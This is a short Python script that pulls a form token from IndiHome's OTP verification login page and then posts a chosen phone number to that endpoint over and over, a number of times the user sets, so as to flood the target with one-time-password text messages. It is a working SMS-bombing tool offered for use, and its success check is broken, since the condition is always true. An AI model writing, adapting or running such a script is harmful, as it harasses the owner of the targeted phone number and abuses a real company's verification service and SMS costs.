import re
import sys
import requests
import os
os.system("figlet ARJUN-LOVE")
s = requests.Session()
url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"

no = input("no : ")
jml = input("jumlah spam : ")

token = s.get(url).text



token = re.findall(r"name=\"_token\" value=\"(.*?)\"", token)[0]
print(token)
data = {
"_token":token,
"msisdn":no,
}

for x in range(int(jml)):
    send = s.post(url, data=data).text

    if 'Gagal!' or 'dikirim' in send:
        print("spam sukses")
    else:
        print("eror")
        sys.exit()

